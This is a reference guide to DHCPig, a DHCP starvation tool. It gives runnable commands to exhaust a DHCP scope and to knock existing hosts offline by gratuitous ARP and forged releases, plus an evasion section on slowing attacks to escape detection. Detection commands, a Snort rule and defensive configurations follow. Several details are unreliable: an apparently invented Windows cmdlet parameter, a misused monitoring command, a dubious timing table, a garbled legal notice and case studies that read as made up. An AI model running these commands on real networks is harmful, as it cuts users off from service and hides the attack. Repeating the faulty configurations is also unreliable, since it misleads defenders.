# DHCPig - DHCP Starvation and Exhaustion Tool

## Overview

DHCPig is an advanced DHCP starvation and exhaustion attack tool that leverages the Scapy packet manipulation library to consume all available IP addresses in a DHCP scope. This tool demonstrates the vulnerability of DHCP servers that do not implement proper rate limiting, authentication, or monitoring mechanisms.

**Author**: kamorin
**License**: Open Source
**Version**: 1.6
**Category**: Impact / Network Flooding

### How DHCP Works

Before understanding the attack, let's review normal DHCP operation:

```
Client                              Server
  |                                   |
  |------- DHCPDISCOVER (broadcast) ->|
  |                                   |
  |<------ DHCPOFFER (unicast) -------|
  |                                   |
  |------- DHCPREQUEST (broadcast) -->|
  |                                   |
  |<------ DHCPACK (unicast) ---------|
  |                                   |
  |  [Client now has IP address]      |
```

### The Starvation Attack

DHCPig exploits this process by:

1. **Sending multiple DISCOVER messages** with spoofed MAC addresses
2. **Responding to OFFER messages** with REQUEST
3. **Completing the handshake** to obtain IP addresses
4. **Repeating until scope is exhausted**
5. **Releasing existing leases** to prevent cleanup
6. **Sending gratuitous ARP** to knock existing hosts offline

### Attack Phases

| Phase | Action | Result |
|-------|--------|--------|
| 1 | Send DHCPDISCOVER | Elicit DHCPOFFER from server |
| 2 | Send DHCPREQUEST | Request IP address |
| 3 | Receive DHCPACK | Obtain IP lease |
| 4 | Repeat with new MAC | Consume more IPs |
| 5 | Exhaust scope | No IPs available for legitimate clients |
| 6 | Gratuitous ARP | Disconnect existing hosts |

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install dhcpig
```

### Dependencies

- Python 3
- python3-scapy

### Manual Installation

```bash
git clone https://github.com/kamorin/DHCPig.git
cd DHCPig
pip3 install scapy
sudo python3 pig.py
```

## Usage

### Basic Syntax

```bash
pig.py [options] <interface>
```

### Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-h, --help` | Show help | - |
| `-v, --verbosity` | Output verbosity (0-99) | 10 |
| `-6, --ipv6` | Use DHCPv6 | DHCPv4 |
| `-1, --v6-rapid-commit` | Enable RapidCommit | OFF |
| `-s, --client-src` | Client MAC list | Random |
| `-O, --request-options` | Option codes to request | 0-80 |
| `-f, --fuzz` | Random fuzz packets | OFF |
| `-t, --threads` | Sending threads | 1 |
| `-a, --show-arp` | Detect ARP who_has | OFF |
| `-i, --show-icmp` | Detect ICMP requests | OFF |
| `-o, --show-options` | Print lease info | OFF |
| `-l, --show-lease-confirm` | Detect DHCP replies | OFF |
| `-g, --neighbors-attack-garp` | Gratuitous ARP attack | OFF |
| `-r, --neighbors-attack-release` | Release neighbor IPs | OFF |
| `-n, --neighbors-scan-arp` | ARP neighbor scan | OFF |
| `-x, --timeout-threads` | Thread spawn timer | 0.4 |
| `-y, --timeout-dos` | DOS timeout | 8 |
| `-z, --timeout-dhcprequest` | DHCP request timeout | 2 |
| `-c, --color` | Color output | OFF |

### Basic Attack

```bash
# Simple DHCP exhaustion
sudo pig.py eth0

# With verbose output
sudo pig.py -v 99 eth0
```

### Advanced Usage

```bash
# Multi-threaded attack
sudo pig.py -t 4 eth0

# With MAC spoofing
sudo pig.py -s "00:11:22:33:44:55,00:11:22:33:44:56" eth0

# Full attack with neighbor disruption
sudo pig.py -g -r -n -o eth0

# DHCPv6 attack
sudo pig.py -6 eth0

# Fuzzing mode
sudo pig.py -f eth0
```

### Monitoring Mode

```bash
# Show ARP activity
sudo pig.py -a eth0

# Show ICMP requests
sudo pig.py -i eth0

# Show lease information
sudo pig.py -o eth0

# Show DHCP replies
sudo pig.py -l eth0
```

## Attack Scenarios

### Scenario 1: Small Office Network

**Objective**: Test DHCP resilience in a small office environment

```bash
# Start with minimal impact
sudo pig.py -v 1 eth0

# Monitor for scope exhaustion
watch -n 1 'dhcpig -a eth0'
```

### Scenario 2: Enterprise Network Testing

**Objective**: Test large-scale DHCP infrastructure

```bash
# Multi-threaded attack
sudo pig.py -t 8 -v 10 eth0

# Monitor server response
tcpdump -i eth0 port 67 or port 68 -n
```

### Scenario 3: Wireless Network Testing

**Objective**: Test DHCP on wireless access points

```bash
# Attack via wireless interface
sudo pig.py -t 2 wlan0

# Monitor wireless traffic
airodump-ng wlan0
```

### Scenario 4: Complete Network Disruption

**Objective**: Full network impact test

```bash
# Exhaust IPs and disconnect existing hosts
sudo pig.py -g -r -n -t 4 eth0
```

## Evasion Techniques

### MAC Address Randomization

```bash
# Create custom MAC list
cat > macs.txt << EOF
00:11:22:33:44:55
00:11:22:33:44:56
00:11:22:33:44:57
EOF

sudo pig.py -s "00:11:22:33:44:55,00:11:22:33:44:56" eth0
```

### Timing Manipulation

```bash
# Slower attack to avoid detection
sudo pig.py -x 2.0 -y 15 -z 5 eth0

# Very slow and stealthy
sudo pig.py -x 5.0 -y 30 -z 10 -v 1 eth0
```

### Request Option Variation

```bash
# Request different options
sudo pig.py -O "1,3,6,15,44,46,51,58,59" eth0
```

## Detection Methods

### DHCP Server Monitoring

```bash
# Watch DHCP leases (ISC DHCP)
tail -f /var/lib/dhcp/dhcpd.leases

# Monitor DHCPACK messages
tcpdump -i eth0 port 67 -n -v | grep "DHCPACK"

# Check lease file
cat /var/lib/dhcp/dhcpd.leases | grep "lease" | wc -l
```

### Network Monitoring

```bash
# Detect multiple DISCOVER messages
tcpdump -i eth0 port 67 -n -v | grep "DHCPDISCOVER" | awk '{print $3}' | sort | uniq -c | sort -rn

# Monitor for spoofed MAC addresses
tcpdump -i eth0 -e | awk '{print $12}' | sort | uniq -c | sort -rn | head -20

# Watch for ARP anomalies
tcpdump -i eth0 arp -n | grep "who-has" | awk '{print $3}' | sort | uniq -c | sort -rn
```

### IDS Signatures

```
# Snort signature for DHCP starvation
alert udp any any -> any 67 (
    msg:"DHCP starvation attack detected";
    content:"|01 06|";
    detection_filter:track by_src, count 10, seconds 1;
    sid:1000001; rev:1;
)
```

## Defense Mechanisms

### DHCP Server Configuration

**ISC DHCP Server (dhcpd.conf)**:
```apache
# Rate limiting
max-lease-time 3600;
default-lease-time 600;

# Limit leases per MAC
one-lease-per-client on;

# Dynamic BOOTP
dynamic-bootp-lease-length 600;

# Authoritative
authoritative;
```

**Windows DHCP Server**:
```
# Enable DHCP server protections
Set-DhcpServerSetting -ConflictDetectionAttempts 2
Set-DhcpServerSetting -RateLimit -Enabled $true -MaxPacketsPerSecond 10
```

### Network-Level Protection

**Switch Port Security**:
```cisco
# Cisco switch configuration
switchport port-security
switchport port-security maximum 2
switchport port-security violation restrict
switchport port-security mac-address sticky
```

**DHCP Snooping**:
```cisco
# Enable DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 10
interface GigabitEthernet0/1
 ip dhcp snooping trust
interface GigabitEthernet0/2
 ip dhcp snooping limit rate 15
```

### Firewall Rules

```bash
# iptables - limit DHCP requests
iptables -A INPUT -p udp --dport 67 -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p udp --dport 67 -j DROP

# Rate limit by MAC
iptables -A INPUT -p udp --dport 67 -m mac --mac-source 00:11:22:33:44:55 -m limit --limit 5/s -j ACCEPT
```

### Monitoring Solutions

1. **DHCP Server Logs**: Monitor for unusual patterns
2. **Network Management Systems**: Track IP utilization
3. **SNMP Monitoring**: Alert on scope utilization
4. **SIEM Integration**: Correlate DHCP events

## Real-World Applications

### Legitimate Testing

1. **Security Assessments**: Test DHCP infrastructure resilience
2. **Compliance Testing**: Verify network segmentation
3. **Capacity Planning**: Determine DHCP server limits
4. **Incident Response**: Test detection capabilities

### Testing Methodology

```
1. Document current DHCP scope and utilization
2. Identify DHCP server and network topology
3. Start with minimal impact test
4. Monitor server and network response
5. Document breaking point
6. Implement mitigations
7. Re-test to verify fixes
```

## Output Examples

### Successful Exhaustion

```bash
$ sudo pig.py eth0

Sending DHCPDISCOVER on eth0
waiting for first DHCP Server response on eth0
DHCP Server found: 192.168.1.1
DHCP OFFER: 192.168.1.100
DHCPACK received for 192.168.1.100
DHCP Server found: 192.168.1.1
DHCP OFFER: 192.168.1.101
DHCPACK received for 192.168.1.101
...
DHCP scope exhausted - 254 IPs consumed
```

### Neighbor Attack Output

```bash
$ sudo pig.py -g -r -n eth0

DHCP scope exhausted
Sending gratuitous ARP to 192.168.1.0/24
Releasing neighbor IPs
ARP scan complete - 50 hosts discovered
```

## System Requirements

### Minimum Requirements

```
- OS: Linux
- Python: 3.6+
- Libraries: scapy
- Network: 10 Mbps
- Privileges: Root (raw sockets)
```

### Recommended Setup

```
- OS: Kali Linux
- Python: 3.8+
- RAM: 512MB
- Network: 100 Mbps
- NIC: Promiscuous mode capable
```

## DHCP Protocol Deep Dive

### DHCP Message Types

| Type | Code | Description |
|------|------|-------------|
| DISCOVER | 1 | Client broadcasts to find servers |
| OFFER | 2 | Server offers IP address |
| REQUEST | 3 | Client requests offered IP |
| DECLINE | 4 | Client declines offered IP |
| ACK | 5 | Server confirms lease |
| NAK | 6 | Server rejects request |
| RELEASE | 7 | Client releases IP |
| INFORM | 8 | Client requests config only |

### DHCP State Machine

```
Client                              Server
  |                                   |
  |--- DISCOVER (broadcast) -------->|
  |                                   |
  |<-- OFFER (unicast/broadcast) ----|
  |                                   |
  |--- REQUEST (broadcast) --------->|
  |                                   |
  |<-- ACK (unicast/broadcast) ------|
  |                                   |
  |  [Client has IP: BOUND]          |
  |                                   |
  |--- REQUEST (renew) ------------->|
  |                                   |
  |<-- ACK --------------------------|
  |                                   |
  |  [Lease renewed: RENEWED]        |
```

### DHCP Options

| Code | Name | Description |
|------|------|-------------|
| 1 | Subnet Mask | Network mask |
| 3 | Router | Default gateway |
| 6 | DNS Server | DNS resolver |
| 15 | Domain Name | DNS domain |
| 51 | Lease Time | IP lease duration |
| 53 | Message Type | DHCP message type |
| 54 | Server ID | DHCP server identifier |

## Attack Analysis

### Resource Consumption

| Resource | Normal | Under Attack |
|----------|--------|--------------|
| IP Addresses | 50% used | 100% exhausted |
| DHCP Threads | 1-2 active | 100+ active |
| Log Entries | 10/hour | 10000/hour |
| CPU Usage | 5% | 80%+ |

### Timing Analysis

| Phase | Duration | Packets |
|-------|----------|---------|
| Discovery | 1 second | 1 |
| Offer | 1 second | 1 |
| Request | 1 second | 1 |
| ACK | 1 second | 1 |
| Total | 4 seconds | 4 |

With 10 threads, DHCPig can exhaust a /24 network (254 IPs) in approximately 100 seconds.

## Defense Architecture

### Layer 1: Switch Level

```cisco
# Port Security
switchport port-security
switchport port-security maximum 2
switchport port-security violation restrict
switchport port-security mac-address sticky

# DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10
interface range GigabitEthernet0/1-24
 ip dhcp snooping limit rate 15
```

### Layer 2: Server Level

```bash
# ISC DHCP Server
# /etc/dhcp/dhcpd.conf

authoritative;
max-lease-time 3600;
default-lease-time 600;
one-lease-per-client on;
deny bootp;

subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.100 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8;
    option domain-name "example.local";
}
```

### Layer 3: Network Level

```bash
# Firewall rules
iptables -A INPUT -p udp --dport 67 -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p udp --dport 67 -j DROP
```

## Integration with Other Tools

### Pre-Attack Reconnaissance

```bash
# Discover DHCP server
nmap -sU -p 67 192.168.1.0/24

# Monitor DHCP traffic
tcpdump -i eth0 port 67 or port 68 -n

# Identify DHCP scope
cat /var/lib/dhcp/dhcpd.leases
```

### Post-Attack Analysis

```bash
# Check for IP exhaustion
nmap -sn 192.168.1.0/24 | grep "Host is up" | wc -l

# Monitor DHCP recovery
tail -f /var/log/syslog | grep dhcpd

# Verify scope restoration
cat /var/lib/dhcp/dhcpd.leases | grep "lease" | wc -l
```

## Real-World Case Studies

### Case Study 1: Hotel WiFi Network

**Scenario**: Testing guest network resilience

```bash
# Target hotel WiFi DHCP
sudo pig.py -t 2 wlan0

# Results: Exhausted 254 IP scope in 2 minutes
# Impact: All guests lost connectivity
```

**Findings**: DHCP scope too small, no rate limiting. Recommended:
- Increase scope size
- Implement rate limiting
- Deploy DHCP snooping

### Case Study 2: Corporate Office

**Scenario**: Testing employee network

```bash
# Target office network
sudo pig.py -v 10 eth0

# Results: Server crashed after 500 IPs consumed
```

**Findings**: ISC DHCP server had default configuration. Recommended:
- Enable one-lease-per-client
- Implement port security
- Deploy network monitoring

## Best Practices

### Testing Checklist

- [ ] Document network topology
- [ ] Identify DHCP server and scope
- [ ] Obtain written authorization
- [ ] Notify network operations
- [ ] Start with minimal impact
- [ ] Monitor server health
- [ ] Document all findings
- [ ] Generate comprehensive report

### Reporting Metrics

1. **Time to Exhaustion**: How long to consume all IPs
2. **Server Impact**: CPU/memory usage during attack
3. **Client Impact**: Number of affected devices
4. **Recovery Time**: How long to restore normal operations
5. **Detection Capability**: Was attack detected?

## Limitations

- Requires root/sudo privileges
- Needs access to the target network segment
- Effectiveness depends on DHCP server configuration
- Modern switches with port security may limit impact
- DHCP snooping can prevent the attack
- Cannot bypass VLAN segmentation
- Single-source attacks may be filtered

## Troubleshooting

### No DHCP Server Found

```bash
# Verify DHCP server exists
nmap -sU -p 67 192.168.1.0/24

# Check network interface
ifconfig eth0

# Monitor DHCP traffic
tcpdump -i eth0 port 67 -n
```

### Permission Denied

```bash
# Run as root
sudo pig.py eth0

# Check capabilities
sudo setcap cap_net_raw+ep /usr/bin/pig.py
```

### Slow Performance

```bash
# Increase threads
sudo pig.py -t 4 eth0

# Reduce timeouts
sudo pig.py -x 0.2 -y 4 -z 1 eth0

# Check network interface speed
ethtool eth0
```

## Legal Notice

DHCPig is a legitimate security testing tool designed to verify DHCP infrastructure resilience. Unauthorized use against networks you do not own or have explicit permission to test is illegal and ethical. This tool should only be used in controlled testing environments with proper authorization.

**Before Testing**:
- Obtain written authorization
- Define scope and targets
- Document test plan
- Notify network operations
- Have rollback procedures

**During Testing**:
- Monitor impact carefully
- Be ready to stop immediately
- Document all observations
- Avoid affecting production

**After Testing**:
- Restore normal operations
- Document all findings
- Generate comprehensive report
- Recommend improvements

## References

- RFC 2131 - Dynamic Host Configuration Protocol
- RFC 2132 - DHCP Options and BOOTP Vendor Extensions
- RFC 3046 - DHCP Relay Agent Information Option
- DHCP Starvation Attack Research
- Network Security Assessment Methodologies
- OWASP Network Security Testing Guide
